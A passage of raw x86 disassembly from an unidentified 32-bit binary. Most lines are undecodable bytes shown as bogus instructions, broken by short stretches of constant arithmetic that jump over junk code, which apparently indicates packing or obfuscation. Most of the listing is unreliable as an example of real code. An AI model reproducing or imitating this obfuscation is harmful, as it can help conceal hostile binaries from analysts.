  40e1a1:	adc    al,0x18
  40e1a3:	sbb    al,cl
  40e1a5:	dec    ebp
  40e1a6:	jns    0x40e1d7
  40e1a8:	(bad)
  40e1ab:	xchg   BYTE PTR [esi+0x2c],bh
  40e1ae:	adc    BYTE PTR [esp+ecx*8-0x66],0xa7
  40e1b3:	sahf   
  40e1b4:	cmp    eax,0x8de4b24f
  40e1b9:	jecxz  0x40e22f
  40e1bb:	lock dec edi
  40e1bd:	sbb    al,dh
  40e1bf:	xor    eax,0x49f58530
  40e1c4:	mov    ebp,0xacc0b675
  40e1c9:	test   BYTE PTR [edi-0x2],cl
  40e1cc:	fbld   TBYTE PTR [edx+0x67]
  40e1cf:	outs   dx,DWORD PTR ds:[esi]
  40e1d0:	adc    eax,0xb1aebc65
  40e1d5:	lea    ebp,[ebx+eax*4-0x1f2a3f2f]
  40e1dc:	push   0x4
  40e1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1df:	push   esp
  40e1e0:	call   0xadef:0x43cb90eb
  40e1e7:	xor    al,0xfd
  40e1e9:	xchg   edx,eax
  40e1ea:	inc    esi
  40e1eb:	ins    BYTE PTR es:[edi],dx
  40e1ec:	sahf   
  40e1ed:	sbb    ebx,DWORD PTR [ecx]
  40e1ef:	adc    al,0xdb
  40e1f1:	adc    DWORD PTR [ebx-0x72],0xb2d3e7d1
  40e1f8:	push   ebx
  40e1f9:	scas   al,BYTE PTR es:[edi]
  40e1fa:	jmp    0x64103d5e
  40e1ff:	mov    eax,ds:0xd9a9cd09
  40e204:	dec    edx
  40e205:	mov    ebp,0xb25f4cc2
  40e20a:	ds (bad) 
  40e20c:	fcomi  st,st(7)
  40e20e:	mov    bh,0x90
  40e210:	js     0x40e201
  40e212:	mov    BYTE PTR [eax],ch
  40e214:	stos   BYTE PTR es:[edi],al
  40e215:	mov    al,ds:0xd735fe06
  40e21a:	xchg   edx,eax
  40e21b:	sub    ch,BYTE PTR [ecx+0x3a]
  40e21e:	data16 jae 0x40e209
  40e221:	and    BYTE PTR [edx-0x17acb36c],al
  40e227:	sbb    esp,DWORD PTR [esi]
  40e229:	jns    0x40e1bd
  40e22b:	push   es
  40e22c:	loopne 0x40e2a6
  40e22e:	lock mov edi,0x7a1e7fb7
  40e234:	mov    ds:0x245492ab,eax
  40e239:	aad    0xc4
  40e23b:	add    bl,BYTE PTR [ebx+0x300469ac]
  40e241:	inc    edx
  40e242:	(bad)  
  40e244:	fsub   DWORD PTR [edx-0x4a]
  40e247:	fild   QWORD PTR ds:0xc46a857c
  40e24d:	mov    ecx,0x2fd4488e
  40e252:	sub    BYTE PTR [ecx+0xffeb56f],ah
  40e258:	mov    WORD PTR [edi],gs
  40e25a:	or     ch,bh
  40e25c:	inc    edi
  40e25d:	lods   al,BYTE PTR ds:[esi]
  40e25e:	or     BYTE PTR [edx],dl
  40e260:	test   eax,0xc426f717
  40e265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e266:	sbb    eax,0x7913ad84
  40e26b:	icebp  
  40e26c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e26d:	sub    DWORD PTR [ecx+0x36c77c31],esp
  40e273:	mov    ebp,0xd44fe3b0
  40e278:	mov    dl,0xcf
  40e27a:	mov    ah,0x80
  40e27c:	mov    esp,DWORD PTR [ecx]
  40e27e:	mov    ecx,0x4e6019
  40e283:	bound  ecx,QWORD PTR [eax]
  40e285:	and    bh,0x83
  40e288:	cmp    ah,0x2f
  40e28b:	mov    bl,0x87
  40e28d:	icebp  
  40e28e:	(bad)  
  40e28f:	daa    
  40e290:	push   eax
  40e291:	out    0xc5,al
  40e293:	lahf   
  40e294:	sti    
  40e295:	(bad)  
  40e296:	aad    0xac
  40e298:	ins    BYTE PTR es:[edi],dx
  40e299:	js     0x40e251
  40e29b:	mov    cl,0xd3
  40e29d:	sub    BYTE PTR [ebp+0x434551e1],ah
  40e2a3:	sbb    al,bl
  40e2a5:	pop    ebp
  40e2a6:	pop    esi
  40e2a7:	scas   al,BYTE PTR es:[edi]
  40e2a8:	add    ecx,DWORD PTR [edi+0x2b]
  40e2ab:	shr    edi,cl
  40e2ad:	lahf   
  40e2ae:	mov    ds:0x8cbead16,al
  40e2b3:	and    edi,0xffffff8a
  40e2b6:	pop    DWORD PTR [edx]
  40e2b8:	in     al,0x61
  40e2ba:	xchg   ebp,eax
  40e2bb:	xor    dh,BYTE PTR [edx+ebx*2-0x3f652113]
  40e2c2:	or     edi,DWORD PTR [edx+esi*8]
  40e2c5:	fldcw  WORD PTR [ebx-0x46]
  40e2c8:	xchg   ebp,eax
  40e2c9:	ins    DWORD PTR es:[edi],dx
  40e2ca:	enter  0xb4fd,0x65
  40e2ce:	cmp    ebx,edi
  40e2d0:	movd   mm5,DWORD PTR [esi-0x2a]
  40e2d4:	mov    dl,0xd2
  40e2d6:	stos   DWORD PTR es:[edi],eax
  40e2d7:	aad    0x29
  40e2d9:	cmc    
  40e2da:	lock xchg ax,ax
  40e2dd:	xor    BYTE PTR [edx],dh
  40e2df:	mov    ds:0x993bbc3d,al
  40e2e4:	inc    esi
  40e2e5:	mov    WORD PTR [ebp-0x13],?
  40e2e8:	xchg   edx,eax
  40e2e9:	inc    eax
  40e2ea:	ds and eax,0x6352a417
  40e2f0:	push   0xffffffc9
  40e2f2:	push   ss
  40e2f3:	inc    esi
  40e2f4:	rcr    DWORD PTR [ecx],1
  40e2f6:	clc    
  40e2f7:	xchg   ebp,eax
  40e2f8:	xchg   ebp,ebx
  40e2fa:	and    esi,DWORD PTR [eax+0x76]
  40e2fd:	sbb    ebp,edx
  40e2ff:	call   0xd31de961
  40e304:	call   0xc096:0x4834703a
  40e30b:	in     eax,dx
  40e30c:	outs   dx,DWORD PTR ds:[esi]
  40e30d:	sbb    ch,dh
  40e30f:	inc    ecx
  40e310:	lahf   
  40e311:	pusha  
  40e312:	xor    DWORD PTR [ebx-0x20],edx
  40e315:	dec    BYTE PTR [eax-0x5e489657]
  40e31b:	xlat   BYTE PTR ds:[ebx]
  40e31c:	sti    
  40e31d:	pusha  
  40e31e:	fistp  WORD PTR [edx+0x69]
  40e321:	(bad)  
  40e322:	(bad)  
  40e323:	add    al,0x5
  40e325:	mov    ebp,0x52880fec
  40e32a:	jmp    0x40e313
  40e32c:	iret   
  40e32d:	inc    esi
  40e32e:	inc    ebp
  40e32f:	loop   0x40e30c
  40e331:	dec    eax
  40e332:	mov    esp,0x2fab84d8
  40e337:	xchg   DWORD PTR [edi+eax*2+0x2c],ecx
  40e33b:	inc    ebx
  40e33c:	dec    edi
  40e33d:	pop    edi
  40e33e:	or     DWORD PTR [esi],0x56ec0a60
  40e344:	mul    al
  40e346:	repz jmp 0x40e2f4
  40e349:	pop    edi
  40e34a:	cs pop esi
  40e34c:	push   DWORD PTR [ebx+0x76]
  40e34f:	sub    ch,BYTE PTR [esi+0x6650b555]
  40e355:	movaps xmm3,XMMWORD PTR [esi+0x38]
  40e359:	icebp  
  40e35a:	cmc    
  40e35b:	fwait
  40e35c:	cmp    dh,cl
  40e35e:	pushf  
  40e35f:	jge    0x40e30c
  40e361:	call   0xaaf9:0x4af7ef40
  40e368:	or     eax,0x95b48e57
  40e36d:	cmp    dh,al
  40e36f:	(bad)  
  40e370:	hlt    
  40e371:	cwde   
  40e372:	and    DWORD PTR [ebx+0x4ff0d079],esp
  40e378:	mov    ?,ecx
  40e37a:	pushf  
  40e37b:	mov    gs,WORD PTR [ebx+0x1c]
  40e37e:	push   ds
  40e37f:	dec    ecx
  40e380:	fmulp  st(3),st
  40e382:	in     al,0x9e
  40e384:	adc    ebp,esi
  40e386:	xor    BYTE PTR [ebx+0x1e],dl
  40e389:	xor    DWORD PTR [ebp-0x45],esp
  40e38c:	pop    edi
  40e38d:	and    BYTE PTR [esi+0x4c],cl
  40e390:	dec    ebp
  40e391:	repnz xor WORD PTR [ebp+0x6],0x936e
  40e398:	pop    ecx
  40e399:	inc    edx
  40e39a:	ds ja  0x40e3a1
  40e39d:	dec    edx
  40e39e:	cmp    al,0x56
  40e3a0:	sti    
  40e3a1:	mov    ebp,0x68db1805
  40e3a6:	mov    bh,0x16
  40e3a8:	inc    ecx
  40e3a9:	mov    ch,0x9e
  40e3ab:	push   es
  40e3ac:	pop    ebp
  40e3ad:	sar    DWORD PTR [edi],1
  40e3af:	ret    0xb6de
  40e3b2:	add    edi,DWORD PTR [edi+0x1dbf86c5]
  40e3b8:	mov    eax,ds:0x446cbde3
  40e3bd:	bound  esi,QWORD PTR [ebp-0x29bf2d5e]
  40e3c3:	jge    0x40e3e4
  40e3c5:	mov    bl,0xd2
  40e3c7:	adc    dh,BYTE PTR [edi+0x2e]
  40e3ca:	jp     0x40e3a4
  40e3cc:	mov    BYTE PTR [edx],ah
  40e3ce:	adc    eax,0x873e4cea
  40e3d3:	pop    esp
  40e3d4:	sti    
  40e3d5:	xor    al,0xcd
  40e3d7:	call   0x5bb0:0xb0f7e820
  40e3de:	ins    BYTE PTR es:[edi],dx
  40e3df:	call   0xbb42:0x3646c911
  40e3e6:	mov    DWORD PTR [eax+0x5e9400a8],eax
  40e3ec:	and    al,0x44
  40e3ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3ef:	mov    ecx,0xc48824cd
  40e3f4:	test   DWORD PTR [ecx+edx*1],esp
  40e3f7:	outs   dx,DWORD PTR ds:[esi]
  40e3f8:	jl     0x40e459
  40e3fa:	fisttp QWORD PTR [edx]
  40e3fc:	push   esp
  40e3fd:	ror    DWORD PTR [ebp+edi*4+0x422fc456],cl
  40e404:	(bad)  
  40e405:	push   0x1a
  40e407:	mov    ?,WORD PTR [esp+ecx*4-0x20ef1d2a]
  40e40e:	nop
  40e40f:	pop    es
  40e410:	push   edx
  40e411:	cmp    al,0xed
  40e413:	ins    DWORD PTR es:[edi],dx
  40e414:	aaa    
  40e415:	jecxz  0x40e483
  40e417:	daa    
  40e418:	scas   eax,DWORD PTR es:[edi]
  40e419:	(bad)  
  40e41a:	fcom   QWORD PTR [edi-0x11b1b21f]
  40e420:	mov    ds:0x3f53a20a,al
  40e425:	dec    esi
  40e426:	dec    ebp
  40e427:	push   esi
  40e428:	lock push esi
  40e42a:	or     al,0xec
  40e42c:	hlt    
  40e42d:	and    DWORD PTR [edx+0x49],ecx
  40e430:	add    edx,ecx
  40e432:	xor    al,0x17
  40e434:	loop   0x40e41d
  40e436:	add    al,0xa7
  40e438:	lea    ebx,[eax+0x574e0e80]
  40e43e:	mov    ah,BYTE PTR [ecx]
  40e440:	or     eax,0x66672d35
  40e445:	loope  0x40e3f8
  40e447:	pop    ds
  40e448:	call   0x3325:0xd233e56b
  40e44f:	ins    DWORD PTR es:[edi],dx
  40e450:	add    BYTE PTR [eax],al
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x7cb5f12a],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [edi],dh
  40e4eb:	jle    0x40e46d
  40e4ed:	loopne 0x40e46f
  40e4ef:	imul   bl
  40e4f1:	or     ebx,ecx
  40e4f3:	out    dx,eax
  40e4f4:	jno    0x40e54c
  40e4f6:	outs   dx,BYTE PTR ds:[esi]
  40e4f7:	sti    
  40e4f8:	mov    al,0xfd
  40e4fa:	pop    es
  40e4fb:	or     BYTE PTR [ecx+0x29ef0b05],bh
  40e501:	pop    ecx
  40e502:	mov    cl,0x16
  40e504:	fs mov bh,0xe0
  40e507:	dec    esp
  40e508:	test   bh,0x14
  40e50b:	loopne 0x40e588
  40e50d:	test   BYTE PTR [ebx],bl
  40e50f:	push   0x40aeb01e
  40e514:	pushf  
  40e515:	adc    BYTE PTR [edx+esi*8-0x17611d37],dh
  40e51c:	jp     0x40e513
  40e51e:	sahf   
  40e51f:	dec    ebp
  40e520:	xchg   esi,eax
  40e521:	lock loopne 0x40e542
  40e524:	popf   
  40e525:	(bad)  
  40e526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e527:	stc    
  40e528:	xlat   BYTE PTR ds:[ebx]
  40e529:	cmp    edx,0x29
  40e52c:	stc    
  40e52d:	fsub   QWORD PTR [esi-0x7a797c2e]
  40e533:	rcl    ecx,cl
  40e535:	pop    ss
  40e536:	mov    dl,0x12
  40e538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e539:	xchg   ebp,eax
  40e53a:	xor    BYTE PTR [ebp-0x29],cl
  40e53d:	sbb    dl,dl
  40e53f:	cmp    DWORD PTR [ecx-0x4],0xf61935b8
  40e546:	cs sbb al,0x88
  40e549:	jmp    FWORD PTR [edx]
  40e54b:	pop    ecx
  40e54c:	inc    esp
  40e54d:	cwde   
  40e54e:	popa   
  40e54f:	mov    dh,0x79
  40e551:	cmp    ebx,DWORD PTR [ebx]
  40e553:	das    
  40e554:	loop   0x40e579
  40e556:	push   cs
  40e557:	inc    ebx
  40e558:	dec    edi
  40e559:	jmp    0x1f6b:0xbd790f14
  40e560:	sbb    al,0x5f
  40e562:	sbb    al,0x62
  40e564:	(bad)  
  40e566:	mov    ah,0xec
  40e568:	das    
  40e569:	push   ecx
  40e56a:	pop    eax
  40e56b:	mov    bl,0xdd
  40e56d:	scas   eax,DWORD PTR es:[edi]
  40e56e:	mov    ds:0x7b678811,al
  40e573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e574:	sub    DWORD PTR [ebp-0x73c7ff46],edx
  40e57a:	out    0x16,eax
  40e57c:	cdq    
  40e57d:	xchg   edi,eax
  40e57e:	imul   ebx,DWORD PTR [eax-0x21],0xffffffe9
  40e582:	test   al,0x9d
  40e584:	cmc    
  40e585:	inc    edi
  40e586:	imul   ecx,DWORD PTR [edi],0x25df5241
  40e58c:	xchg   esi,ecx
  40e58e:	or     eax,0x65677cfa
  40e593:	dec    eax
  40e594:	pop    edx
  40e595:	repz cmp al,0xab
  40e598:	clc    
  40e599:	inc    ecx
  40e59a:	mov    cl,0x48
  40e59c:	pop    ebx
  40e59d:	hlt    
  40e59e:	jmp    0x40e555
  40e5a0:	cmp    edx,eax
  40e5a2:	and    eax,DWORD PTR [ebx]
  40e5a4:	mov    esp,0x7f573945
  40e5a9:	mov    ds:0x8714a05a,eax
  40e5ae:	push   ss
  40e5af:	cmp    edi,DWORD PTR [ecx]
  40e5b1:	aaa    
  40e5b2:	lahf   
  40e5b3:	or     ecx,DWORD PTR [ecx+0x5b161342]
  40e5b9:	inc    eax
  40e5ba:	fs in  al,dx
  40e5bc:	aam    0xe
  40e5be:	cli    
  40e5bf:	mov    ds:0xddb17fb6,al
  40e5c4:	lock xor BYTE PTR [esi+ebp*1],cl
  40e5c8:	lahf   
  40e5c9:	xchg   edi,eax
  40e5ca:	std    
  40e5cb:	cs xor al,0x3d
  40e5ce:	and    BYTE PTR [ecx-0x77],cl
  40e5d1:	daa    
  40e5d2:	mov    ebp,0x7053d80f
  40e5d7:	bound  ebp,QWORD PTR [esi+esi*2-0x51]
  40e5db:	push   ss
  40e5dc:	xchg   ecx,eax
  40e5dd:	jecxz  0x40e58c
  40e5df:	mov    edx,0xae9f131a
  40e5e4:	fidiv  DWORD PTR [ebx]
  40e5e6:	in     al,dx
  40e5e7:	or     DWORD PTR [eax-0x19125705],eax
  40e5ed:	rcr    al,1
  40e5ef:	push   ebp
  40e5f0:	jae    0x40e5ce
  40e5f2:	or     DWORD PTR [ebx-0x74],0x5aeecff9
  40e5f9:	add    al,0x68
  40e5fb:	xor    eax,0x6dedc9dd
  40e600:	mov    eax,0x72c353b8
  40e605:	mov    bh,0xda
  40e607:	ins    BYTE PTR es:[edi],dx
  40e608:	in     eax,0xa0
  40e60a:	ja     0x40e62d
  40e60c:	sub    eax,0xb27d0564
  40e611:	jnp    0x40e5bf
  40e613:	and    eax,0x4f7d4ec3
  40e618:	pop    ecx
  40e619:	jle    0x40e5bb
  40e61b:	data16 fwait
  40e61d:	mul    ecx
  40e61f:	or     al,0xc7
  40e621:	jno    0x40e602
  40e623:	jbe    0x40e5db
  40e625:	shr    DWORD PTR [eax],cl
  40e627:	scas   eax,DWORD PTR es:[edi]
  40e628:	inc    ebp
  40e629:	push   0xd895f9dc
  40e62e:	sbb    BYTE PTR ds:0xae5d5bf,dl
  40e634:	push   ss
  40e635:	add    DWORD PTR [ebx+0x7b],0xf851ef94
  40e63c:	xor    ebx,DWORD PTR [esp+ebp*8+0x71]
  40e640:	jp     0x40e61d
  40e642:	retf   0xd4c
  40e645:	leave  
  40e646:	shl    BYTE PTR [ebx-0x2e],1
  40e649:	push   cs
  40e64a:	mul    BYTE PTR [esi+0x78]
  40e64d:	dec    esp
  40e64e:	call   0x1fd9:0xd254e071
  40e655:	or     BYTE PTR [ecx],al
  40e657:	add    esp,eax
  40e659:	test   al,0x6b
  40e65b:	not    BYTE PTR [ebx]
  40e65d:	xor    ah,BYTE PTR [ebx-0x80]
  40e660:	jnp    0x40e6be
  40e662:	fstp   st(7)
  40e664:	lods   al,BYTE PTR ds:[esi]
  40e665:	pop    esp
  40e666:	cmp    bl,BYTE PTR [esi+0x44cbe29c]
  40e66c:	push   ds
  40e66d:	cs mov ebx,0xda02ebe8
  40e673:	fistp  QWORD PTR [eax]
  40e675:	test   DWORD PTR [edi-0x77e012d5],ebp
  40e67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e67c:	imul   esp,DWORD PTR [ebx+0x366e4e62],0xf86db2ea
  40e686:	cmp    esp,DWORD PTR ds:0x6cddbd1a
  40e68c:	cli    
  40e68d:	stos   BYTE PTR es:[edi],al
  40e68e:	lea    esi,[ecx]
  40e690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e691:	jns    0x40e65b
  40e693:	dec    edi
  40e694:	in     al,dx
  40e695:	xchg   esp,eax
  40e696:	mov    edx,0x4b5845f2
  40e69b:	sbb    al,0x81
  40e69d:	(bad)  [esi+0x26]
  40e6a0:	xor    ch,BYTE PTR ds:0x78ec87fe
  40e6a6:	jae    0x40e6da
  40e6a8:	cdq    
  40e6a9:	test   eax,0xdc9bd572
  40e6ae:	gs or  DWORD PTR ss:[esi+0x10],0xe5f397a2
  40e6b7:	aas    
  40e6b8:	push   eax
  40e6b9:	xor    al,bh
  40e6bb:	inc    ebx
  40e6bc:	xchg   edi,eax
  40e6bd:	test   bh,ch
  40e6bf:	cmp    eax,DWORD PTR [eax+ebp*2+0x7a]
  40e6c3:	test   eax,0x4da4e9a1
  40e6c8:	and    BYTE PTR [ebx+0x38],cl
  40e6cb:	mov    al,ds:0x41634109
  40e6d0:	neg    DWORD PTR [ebx+0x35cfdd83]
  40e6d6:	int3   
  40e6d7:	mov    edi,0x57d0039f
  40e6dc:	xchg   BYTE PTR [ebp-0x1c67b4e],bl
  40e6e2:	gs retf 
  40e6e4:	push   esi
  40e6e5:	and    eax,0xabd8d4f1
  40e6ea:	test   DWORD PTR [eax],0x2c652b02
  40e6f0:	mov    dl,0xcb
  40e6f2:	aad    0x59
  40e6f4:	sub    DWORD PTR [eax+0x3d],esp
  40e6f7:	or     ebp,esp
  40e6f9:	imul   BYTE PTR [ebx-0x32]
  40e6fc:	xchg   esi,eax
  40e6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fe:	test   BYTE PTR [esi-0x4b],dh
  40e701:	mov    esi,0xd55ca984
  40e706:	xchg   edi,eax
  40e707:	mov    dh,0xc
  40e709:	bound  edx,QWORD PTR [edx+0x36ec3f03]
  40e70f:	in     al,dx
  40e710:	lods   eax,DWORD PTR ds:[esi]
  40e711:	or     DWORD PTR [edx],esi
  40e713:	call   0x7940:0xe60a4af0
  40e71a:	pop    ebx
  40e71b:	(bad)  
  40e71d:	jmp    FWORD PTR [ebx]
  40e71f:	rol    BYTE PTR [ebp-0x5d],cl
  40e722:	rcr    BYTE PTR gs:[edx],1
  40e725:	and    al,0x67
  40e727:	les    edi,FWORD PTR [edx]
  40e729:	pop    es
  40e72a:	dec    ecx
  40e72b:	pushf  
  40e72c:	imul   ebx,DWORD PTR [ecx],0x9e2ccc4a
  40e732:	call   0x39c7:0xa23d1344
  40e739:	cmp    DWORD PTR fs:[edx-0x3206d31b],edi
  40e740:	out    dx,eax
  40e741:	enter  0x9fb3,0x99
  40e745:	jbe    0x40e75d
  40e747:	lock jmp 0x40e751
  40e74a:	mov    ebx,0xb4e8e06f
  40e74f:	add    al,0xb5
  40e751:	mov    eax,0xb1707e88
  40e756:	sahf   
  40e757:	in     eax,dx
  40e758:	sub    eax,0x8baf1b5c
  40e75d:	fisttp QWORD PTR [edi-0x6d24770e]
  40e763:	dec    esi
  40e764:	pop    ds
  40e765:	pop    esp
  40e766:	add    ch,ch
  40e768:	hlt    
  40e769:	xchg   esp,eax
  40e76a:	jae    0x40e71a
  40e76c:	mov    bh,0xac
  40e76e:	outs   dx,BYTE PTR ds:[esi]
  40e76f:	and    edi,eax
  40e771:	ss stc 
  40e773:	out    dx,al
  40e774:	pop    edi
  40e775:	dec    esi
  40e776:	pop    edx
  40e777:	imul   DWORD PTR [esi+0x7d7ac5f3]
  40e77d:	or     esp,DWORD PTR [ebp+0x7e]
  40e780:	push   ebx
  40e781:	sar    DWORD PTR [eax+0x55f7d76c],1
  40e787:	xchg   BYTE PTR [edx+0x64],cl
  40e78a:	inc    ebp
  40e78b:	dec    ebx
  40e78c:	pop    ebp
  40e78d:	nop
  40e78e:	(bad)  
  40e78f:	ins    BYTE PTR es:[edi],dx
  40e790:	std    
  40e791:	sub    ecx,eax
  40e793:	mov    DWORD PTR [ebp+0xc],0x8d3
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	jns    0x40e7c4
  40e7f1:	xor    eax,0x18be426a
  40e7f6:	sbb    dl,dl
  40e7f8:	adc    al,0x18
  40e7fa:	sbb    BYTE PTR [esi],bh
  40e7fc:	bnd jl 0x40e825
  40e7ff:	imul   ecx,DWORD PTR [ecx+0x2b],0x36
  40e803:	test   BYTE PTR [ebx+0x2d],bl
  40e806:	xchg   edi,eax
  40e807:	dec    edx
  40e808:	mov    ch,BYTE PTR [eax+0x65]
  40e80b:	aaa    
  40e80c:	dec    ebp
  40e80d:	dec    eax
  40e80e:	mov    ?,WORD PTR [ebp-0x60d08e91]
  40e814:	mov    gs,WORD PTR [esp+edi*8-0x7dccd398]
  40e81b:	call   0x3feb:0xa2f38c4c
  40e822:	jne    0x40e840
  40e824:	xchg   esi,eax
  40e825:	out    dx,al
  40e826:	xor    edx,DWORD PTR [edi+0x38]
  40e829:	mov    eax,ds:0xa56c13b9
  40e82e:	or     al,0x14
  40e830:	std    
  40e831:	in     al,dx
  40e832:	inc    ecx
  40e833:	pop    ebx
  40e834:	xor    BYTE PTR [edi-0x49405a2d],bh
  40e83a:	inc    ebx
  40e83b:	repnz pop eax
  40e83d:	jge    0x40e82b
  40e83f:	enter  0xd154,0x78
  40e843:	mov    ds:0x4ff768d2,eax
  40e848:	gs stos WORD PTR es:[edi],ax
  40e84b:	(bad)  
  40e84c:	nop
  40e84d:	loop   0x40e893
  40e84f:	dec    esp
  40e850:	mov    bl,0x5d
  40e852:	ret    0x2d9c
  40e855:	out    0xd8,eax
  40e857:	stos   DWORD PTR es:[edi],eax
  40e858:	push   0x2c
  40e85a:	xor    al,0x41
  40e85c:	addr16 xor eax,0xf3d983a4
  40e862:	mov    al,ds:0x30477bfe
  40e867:	pop    es
  40e868:	rol    BYTE PTR [ecx+0x7435a2a1],0x6c
  40e86f:	or     DWORD PTR [ebx-0x5a],edx
  40e872:	aam    0x14
  40e874:	xor    eax,0x1ff354ef
  40e879:	or     eax,DWORD PTR [edx+0x67064b8e]
  40e87f:	jg     0x40e86a
  40e881:	inc    ecx
  40e882:	adc    eax,DWORD PTR [edx]
  40e884:	adc    eax,ebp
  40e886:	inc    ecx
  40e887:	arpl   WORD PTR [ebx-0x30],si
  40e88a:	or     eax,0xc72c288d
  40e88f:	ret    
  40e890:	xor    al,0xb3
  40e892:	sub    BYTE PTR [ecx*1-0x7b3f1d20],0xf3
  40e89a:	mov    dl,0x7e
  40e89c:	xchg   dh,cl
  40e89e:	sbb    al,0x6f
  40e8a0:	pop    ebp
  40e8a1:	push   es
  40e8a2:	and    eax,0x22ba6fc4
  40e8a7:	loopne 0x40e83b
  40e8a9:	ret    0x77a2
  40e8ac:	jns    0x40e888
  40e8ae:	je     0x40e89f
  40e8b0:	mov    esi,0xee4e6d78
  40e8b5:	push   ebx
  40e8b6:	jmp    0xe8ad:0x1c3d94c3
  40e8bd:	mov    al,ds:0xaad8c207
  40e8c2:	es lahf 
  40e8c4:	cwde   
  40e8c5:	push   edi
  40e8c6:	xchg   esp,eax
  40e8c7:	inc    eax
  40e8c8:	bound  ebp,QWORD PTR [esi+0x29]
  40e8cb:	xlat   BYTE PTR ds:[ebx]
  40e8cc:	mov    edx,0x28d35186
  40e8d1:	loope  0x40e923
  40e8d3:	shl    BYTE PTR [ecx],cl
  40e8d5:	retf   0xf32f
  40e8d8:	push   edi
  40e8d9:	xor    esp,ecx
  40e8db:	aam    0x95
  40e8dd:	mov    BYTE PTR [edi-0x54b795bd],bh
  40e8e3:	scas   eax,DWORD PTR es:[edi]
  40e8e4:	cli    
  40e8e5:	sub    esi,esp
  40e8e7:	jne    0x40e90f
  40e8e9:	sbb    ch,BYTE PTR [eax-0x53]
  40e8ec:	dec    ebp
  40e8ed:	and    al,0x8a
  40e8ef:	push   edx
  40e8f0:	push   edi
  40e8f1:	loopne 0x40e927
  40e8f3:	inc    esi
  40e8f4:	and    eax,DWORD PTR [eax+esi*8]
  40e8f7:	jl     0x40e8dd
  40e8f9:	lods   eax,DWORD PTR ds:[esi]
  40e8fa:	inc    esp
  40e8fb:	sub    eax,0x7e84e79a
  40e900:	out    dx,al
  40e901:	or     esp,DWORD PTR [ebx]
  40e903:	ret    0x4f48
  40e906:	jne    0x40e905
  40e908:	add    edx,edx
  40e90a:	xor    cl,cl
  40e90c:	mov    al,0x5
  40e90e:	cmp    eax,0x3fda544d
  40e913:	inc    eax
  40e914:	daa    
  40e915:	lahf   
  40e916:	(bad)  
  40e917:	push   ss
  40e918:	je     0x40e8aa
  40e91a:	rcl    BYTE PTR [ebp+0x159e5b48],cl
  40e920:	xchg   ecx,eax
  40e921:	adc    DWORD PTR gs:[ebp-0x4f3e7781],esi
  40e928:	je     0x40e8c2
  40e92a:	pop    edi
  40e92b:	or     al,0x12
  40e92d:	aas    
  40e92e:	cdq    
  40e92f:	adc    DWORD PTR ds:0x72a09d89,ebx
  40e935:	lods   al,BYTE PTR ds:[esi]
  40e936:	loopne 0x40e92d
  40e938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e939:	outs   dx,BYTE PTR ds:[esi]
  40e93a:	pop    ecx
  40e93b:	loopne 0x40e8cc
  40e93d:	mov    ds:0x32b405f2,eax
  40e942:	cli    
  40e943:	dec    edi
  40e944:	retf   
  40e945:	jbe    0x40e9a5
  40e947:	mov    esi,0xaba45934
  40e94c:	fs push eax
  40e94e:	mov    eax,ds:0xe3bb4297
  40e953:	sub    al,0xb6
